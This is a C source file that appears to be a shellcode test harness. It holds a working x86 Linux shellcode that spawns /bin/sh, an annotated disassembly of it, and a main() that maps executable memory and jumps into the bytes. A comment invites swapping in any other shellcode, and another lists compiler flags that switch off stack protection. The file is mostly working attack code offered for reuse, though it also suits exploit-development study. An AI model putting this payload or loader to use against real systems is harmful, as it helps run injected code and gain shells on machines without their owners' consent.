/* compiler flags -fno-stack-protector -z execstack -m32 */

#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

/**
 * Replace this with any shellcode 
 * keep in mind this is a x86 shellcode and needs the -m32 flag
 */
const char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
                   "\x68\x68\x2f\x62\x69\x6e\x89"
                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
                   "\xcd\x80\x31\xc0\x40\xcd\x80";
/*
 08048060 <_start>:
        8048060: 31 c0                 xor    eax, eax          eax <- 0
        8048062: 50                    push   eax               push 0
        8048063: 68 2f 2f 73 68        push   0x68732f2f        push "//sh"     
        8048068: 68 2f 62 69 6e        push   0x6e69622f        push "/bin"
        804806d: 89 e3                 mov    ebx, esp          ebx <- esp
        804806f: 89 c1                 mov    ecx, eax          ecx <- 0
        8048071: 89 c2                 mov    edx, eax          edx <- 0
        8048073: b0 0b                 mov    al, 0xb           eax <- 11
        8048075: cd 80                 int    0x80              syscall (execve("/bin/sh", 0, 0))
        8048077: 31 c0                 xor    eax, eax          eax <- 0
        8048079: 40                    inc    eax               eax <- 1
        804807a: cd 80                 int    0x80              syscall (exit())
*/

int main(){
    printf("Shellcode Length: %d bytes\n", strlen(shellcode));
    /* Create executable memory for the shellcode */
    unsigned char * payload = mmap(NULL, strlen(shellcode), PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
    /* Copy shellcode into executable memory */
    memcpy(payload, shellcode, strlen(shellcode));

    printf("Executing Shellcode @ %p\n", (void*)payload);
    /* call it */
    (*(void  (*)()) payload)();
}